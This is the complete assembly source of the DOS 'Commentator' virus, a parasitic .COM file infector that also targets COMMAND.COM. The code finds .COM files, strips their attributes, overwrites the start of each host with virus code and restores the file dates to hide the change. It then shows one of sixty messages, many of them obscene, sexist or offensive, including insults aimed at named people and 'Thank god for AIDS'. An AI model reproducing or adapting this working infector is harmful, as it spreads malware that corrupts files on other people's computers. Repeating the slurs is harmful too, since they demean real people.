;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                      Commentator Virus by Glenn...                          ³
;ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;³ This will be a Parasytic Non-Resident .COM infector.                        ³
;³ It will also infect COMMAND.COM.                                            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
.MODEL TINY

Public          VirLen,MovLen

Code		Segment para 'Code'
Assume		Cs:Code,Ds:Code,Es:Code

		Org 100h

Signature       Equ 0DeDeh      ; Signature of virus!

Buff1           Equ 0F100h
Buff2		Equ Buff1+2
VirLen		Equ Offset Einde-Offset Begin
MovLen		Equ Offset Einde-Offset Mover
DTA             Equ 0F000h
Proggie         Equ DTA+1Eh
Lenny           Equ DTA+1Ah

MinLen          Equ Virlen   ;Minimale lengte te besmetten programma
MaxLen          Equ 0EF00h      ; Maximale lengte te besmetten programma

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This part will contain the actual virus code, for searching the
; next victim and infection of it.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Begin:
		Jmp Short OverSig	; Sprong naar Oversig vanwege kenmerk
                DW Signature            ; Herkenningsteken virus
Oversig:
                Pushf                   ;------------------
		Push AX			; Alle registers opslaan voor
		Push BX			; later gebruik van het programma
		Push CX                 ;
		Push DX                 ;
		Push DS                 ;
		Push ES                 ;
		Push SS                 ;
		Push SI                 ;
		Push DI                 ;------------------
InfectPart:
		Mov AX,Sprong           ;------------------
		Mov Buf1,AX             ; Spronggegevens bewaren om
		Mov BX,Source           ; besmette programma te starten
		Mov Buf2,BX             ;------------------
		Mov AH,1Ah		; DTA area instellen op
                Mov DX,DTA              ; $DTA area
		Int 21h                 ;------------------
Vindeerst:	Mov AH,4Eh		; Zoeken naar 1e .COM file in directory
		Mov Cx,1		;
		Lea DX,FindPath         ;
		Int 21h                 ;------------------
		Jnc KijkInfected	; Geen gevonden, goto Afgelopen
		Jmp Afgelopen		;------------------
KijkInfected:
                Mov DX,Cs:[Lenny]       ;------------------
		Cmp DX,MinLen           ; Kijken of programmalengte voldoet
		Jb  ZoekNext            ; aan de eisen van het virus
                Cmp DX,MaxLen           ;
                Ja  ZoekNext            ;------------------
On2:		Mov AH,3Dh		; Zo ja , file openen en file handle
		Mov AL,2		; opslaan
		Mov DX,Proggie		;
		Int 21h			;
		Mov FH,AX               ;------------------
  		Mov BX,AX               ;
 		Mov AH,3Fh              ; Lezen 1e 4 bytes van een file met
 		Mov CX,4                ; een mogelijk kenmerk van het virus
		Mov DX,Buff1            ;
		Int 21h                 ;------------------
Sluiten:	Mov AH,3Eh		; File weer sluiten
		Int 21h			;------------------
		Mov AX,CS:[Buff2]	; Vergelijken inhoud lokatie Buff1+2
                Cmp AX,Signature        ; met Signature. Niet gelijk : Zoeken op
                Jnz Infect              ; morgoth virus. Als bestand al besmet
ZoekNext:
		Mov AH,4Fh              ;------------------
		Int 21h                 ; Zoeken naar volgende .COM file
		Jnc KijkInfected        ; Geen gevonden, goto Afgelopen
                Jmp Afgelopen           ;------------------
Infect:
                Mov DX,Proggie	        ; beveiliging weghalen
		Mov AH,43h              ;
		Mov AL,1                ;
                Xor CX,Cx
		Int 21h                 ;------------------
		Mov AH,3Dh		; Bestand openen
		Mov AL,2                ;
                Mov DX,Proggie          ;
		Int 21h                 ;------------------
		Mov FH,AX		; Opslaan op stack van
		Mov BX,AX               ; datum voor later gebruik
		Mov AH,57H              ;
		Mov AL,0                ;
		Int 21h                 ;
		Push CX                 ;
		Push DX                 ;------------------
		Mov AH,3Fh              ; Inlezen van eerste deel van het
		Mov CX,VirLen+2		; programma om later terug te
		Mov DX,Buff1            ; kunnen plaatsen.
		Int 21h                 ;------------------
		Mov AH,42H		; File Pointer weer naar het
		Mov AL,2		; einde van het programma
		Xor CX,CX		; zetten
		Xor DX,DX		;
		Int 21h                 ;------------------
		Xor DX,DX		; Bepalen van de variabele sprongen
		Add AX,100h             ; in het virus (move-routine)
		Mov Sprong,AX           ;
		Add AX,MovLen		;
		Mov Source,AX           ;------------------
		Mov AH,40H              ; Move routine bewaren aan
                Mov DX,Offset Mover     ; einde van file
		Mov CX,MovLen           ;
		Int 21h                 ;------------------
		Mov AH,40H              ; Eerste deel programma aan-
		Mov DX,Buff1            ; voegen na Move routine
		Mov CX,VirLen           ;
		Int 21h                 ;------------------
                Mov AH,42h              ; File Pointer weer naar
		Mov AL,0		; het begin van file
		Xor CX,CX               ; sturen
		Xor DX,DX               ;
		Int 21h                 ;------------------
		Mov AH,40h              ; En programma overschrijven
		Mov DX,Offset Begin     ; met code van het virus
		Mov CX,VirLen           ;
		Int 21h                 ;------------------
		Mov AH,57h		; Datum van aangesproken file
		Mov AL,1                ; weer herstellen
		Pop DX                  ;
		Pop CX                  ;
		Int 21h                 ;------------------
		Mov AH,3Eh		; Sluiten file
		Int 21h                 ;------------------
Afgelopen:	Mov BX,Buf2             ; Sprongvariabelen weer
		Mov Source,BX           ; op normaal zetten voor
		Mov AX,Buf1             ; de Move routine
		Mov Sprong,AX           ;------------------
		Mov AH,1Ah              ; DTA adres weer op normaal
		Mov Dx,80h              ; zetten en naar de Move
		Int 21h                 ; routine springen
                Mov Ah,2Ch
                Int 21h
                Xor DL,DL
                Xchg Dh,Dl
                Add Dx,Dx
;               And Dx,11111110b
                Add Dx,Offset MsgTab
                Mov Si,Dx
                Mov Dx,Cs:[SI]
                Mov AH,9
                Int 21h
                Jmp CS:[Sprong]         ;------------------

Msgtab          DW offset Msg1
                DW offset Msg2
                DW offset Msg3
                DW offset Msg4
                DW offset Msg5
                DW offset Msg6
                DW offset Msg7
                DW offset Msg8
                DW offset Msg9
                DW offset Msg10
                DW offset Msg11
                DW offset Msg12
                DW offset Msg13
                DW offset Msg14
                DW offset Msg15
                DW offset Msg16
                DW offset Msg17
                DW offset Msg18
                DW offset Msg19
                DW offset Msg20
                DW offset Msg21
                DW offset Msg22
                DW offset Msg23
                DW offset Msg24
                DW offset Msg25
                DW offset Msg26
                DW offset Msg27
                DW offset Msg28
                DW offset Msg29
                DW offset Msg30
                DW offset Msg31
                DW offset Msg32
                DW offset Msg33
                DW offset Msg34
                DW offset Msg35
                DW offset Msg36
                DW offset Msg37
                DW offset Msg38
                DW offset Msg39
                DW offset Msg40
                DW offset Msg41
                DW offset Msg42
                DW offset Msg43
                DW offset Msg44
                DW offset Msg45
                DW offset Msg46
                DW offset Msg47
                DW offset Msg48
                DW offset Msg49
                DW offset Msg50
                DW offset Msg51
                DW offset Msg52
                DW offset Msg53
                DW offset Msg54
                DW offset Msg55
                DW offset Msg56
                DW offset Msg57
                DW offset Msg58
                DW offset Msg59
                DW offset Msg60

Msg1            Db 13,10,'Cycle sluts from hell',13,10,'$'
Msg2            Db 13,10,'Virus Mania IV',13,10,'$'
Msg3            Db 13,10,'2 Live Crew is fucking cool',13,10,'$'
Msg4            Db 13,10,'Like Commentator I, HIP-HOP sucks',13,10,'$'
Msg5            Db 13,10,'Dr. Ruth is a first-class lady!',13,10,'$'
Msg6            Db 13,10,'Dont be a wimp, be dead!',13,10,'$'
Msg7            Db 13,10,'This dick was made for laying girls.',13,10,'$'
Msg8            Db 13,10,'No virus entry, just me!',13,10,'$'
Msg9            Db 13,10,'Dont bite it, you horny bitch!',13,10,'$'
Msg10           Db 13,10,'Stroke my keys, oh YES!',13,10,'$'
Msg11           Db 13,10,'Sex Revolution 4000',13,10,'$'
Msg12           Db 13,10,'Buck Rogers is fake',13,10,'$'
Msg13           Db 13,10,'(C) by Glenn Benton',13,10,'$'
Msg14           Db 13,10,'Registration number required',13,10,'$'
Msg15           Db 13,10,'The fly is alive',13,10,'$'
Msg16           Db 13,10,'Dont fuck with me, or I will kick some ass...',13,10,'$'
Msg17           Db 13,10,'Hey, dont hit the keys that hard!',13,10,'$'
Msg18           Db 13,10,'You will feel me...',13,10,'$'
Msg19           Db 13,10,'BEER BEER BEER BEER BEER BEER BEER!!!',13,10,'$'
Msg20           Db 13,10,'YOU HAVE A VIRUS, BWAH AH AH EH EH HEH ARF!',13,10,'$'
Msg21           Db 13,10,'I would alter Michael Jacksons face with my fists...',13,10,'$'
Msg22           Db 13,10,'WIM KOK IS STILL A COMMUNIST!',13,10,'$'
Msg23           Db 13,10,'Welcome to COMMENTATOR II',13,10,'$'
Msg24           Db 13,10,'Commentator I & II released!',13,10,'$'
Msg25           Db 13,10,'Legalize ABORTUS!',13,10,'$'
Msg26           Db 13,10,'Ronald McDonald goes Oude-Pekela!',13,10,'$'
Msg27           Db 13,10,'Source code soon aveable...',13,10,'$'
Msg28           Db 13,10,'Dont use a rubber against this virus!',13,10,'$'
Msg29           Db 13,10,'Swimming holiday in Bangladesh!',13,10,'$'
Msg30           Db 13,10,'Neo Nazis are a pile of shit.',13,10,'$'

Msg31           Db 13,10,'Virus researchers are a pile of meat on the street.',13,10,'$'
Msg32           Db 13,10,'World Championship Cat-Throwing',13,10,'$'
Msg33           Db 13,10,'Yo Yo Yo Yo Yo Yo Yo, James Brown is DEAD!',13,10,'$'
Msg34           Db 13,10,'Yech, you are reminding me of my mother-in-law...',13,10,'$'
Msg35           Db 13,10,'How is the weather out there?',13,10,'$'
Msg36           Db 13,10,'Indalis is a fat bitch who looks like a glass-bin.',13,10,'$'
Msg37           Db 13,10,'Lubbers should be castrated for a long time ago.',13,10,'$'
Msg38           Db 13,10,'Legalize hookers (at a low prize!)',13,10,'$'
Msg39           Db 13,10,'Fist fucking sounds irrelevant to you, eh?',13,10,'$'
Msg40           Db 13,10,'I will be Back...',13,10,'$'
Msg41           Db 13,10,'Today it is..... JUDGEMENT DAY!!!',13,10,'$'
Msg42           Db 13,10,'Never mind the dog, beware of owner.',13,10,'$'
Msg43           Db 13,10,'You still owe me a CO-PROCESSOR!',13,10,'$'
Msg44           Db 13,10,'Do not drink and drive',13,10,'$'
Msg45           Db 13,10,'Last name ALMIGHTY, first name DICK',13,10,'$'
Msg46           Db 13,10,'Frodo lives!',13,10,'$'
Msg47           Db 13,10,'The leech lives',13,10,'$'
Msg48           Db 13,10,'Hey, Cracker Jack! Nice virus you made!',13,10,'$'
Msg49           Db 13,10,'A depressive Prince Claus looks like fun!',13,10,'$'
Msg50           Db 13,10,'Happy Eastern',13,10,'$'
Msg51           Db 13,10,'Thank god for AIDS',13,10,'$'
Msg52           Db 13,10,'Art is incredible stupid',13,10,'$'
Msg53           Db 13,10,'Out of semen error',13,10,'$'
Msg54           Db 13,10,'Incorrect BEF version',13,10,'$'
Msg55           Db 13,10,'Of je stopt de stekker erin?!?',13,10,'$'
Msg56           Db 13,10,'Jean Claude van Damme kicks ass.',13,10,'$'
Msg57           Db 13,10,'Cannabis expands the mind',13,10,'$'
Msg58           Db 13,10,'What is this memory? EMS XMS LIM HMA UMB?',13,10,'$'
Msg59           Db 13,10,'NOOOOOO NOT AN IBM SYSTEM, PLEASE!!!!!',13,10,'$'
Msg60           Db 13,10,'Dutch Virus Research Laboratory',13,10,'$'

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; All variables are stored in here, like filehandle, date/time,
; search path and various buffers.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

FH      	DW 0
FindPath        DB '*.COM',0

Buf1		DW 0
Buf2            DW 0

Sprong		DW 0
Source		DW 0

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This will contain the relocator routine, located at the end of
; the ORIGINAL file. This will tranfer the 1st part of the program
; to it's original place.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Mover:
		Mov DI,Offset Begin	;------------------
		Mov SI,Source           ; Verplaatsen van het 1e deel
		Mov CX,VirLen-1         ; van het programma, wat achter
		Rep Movsb               ;------------------
		Pop DI			; Opgeslagen registers weer
		Pop SI                  ; terugzetten op originele
		Pop SS                  ; waarde en springen naar
		Pop ES                  ; het begin van het programma
		Pop DS                  ; (waar nu het virus niet meer
		Pop DX                  ; staat)
		Pop CX                  ;
		Pop BX                  ;
		Pop AX                  ;
		Popf                    ;
		Mov BX,100h             ;
		Jmp BX	 		;------------------

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Only the end of the virus is stored in here.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Einde		db 0

Code            Ends
End             Begin

;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
